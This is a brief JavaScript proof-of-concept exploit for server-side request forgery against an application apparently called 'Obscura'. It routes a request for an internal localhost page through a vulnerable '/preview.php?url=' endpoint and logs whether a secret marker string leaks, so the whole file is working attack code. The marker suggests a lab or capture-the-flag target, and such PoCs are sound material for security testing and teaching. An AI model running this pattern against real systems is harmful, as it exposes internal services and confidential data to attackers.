(async () => {
  const internalURL = 'http://127.0.0.1/internal-secret.php';
  const attackURL = '/preview.php?url=' +
    encodeURIComponent(internalURL);

  console.log('=== OBSCURA SSRF PoC ===');
  console.log('Target:', internalURL);
  console.log('Attack endpoint:', attackURL);

  // Test direct access
  const direct = await fetch('/internal-secret.php');
  console.log('Direct access HTTP status:', direct.status);

  // Test SSRF through the vulnerable preview endpoint
  const response = await fetch(attackURL, {
    credentials: 'same-origin'
  });

  const body = await response.text();

  console.log('SSRF HTTP status:', response.status);
  console.log(
    'Internal secret exposed:',
    body.includes('OBSCURA_INTERNAL_SECRET=SSRF_SUCCESS')
  );
  console.log('Response:', body);
})();
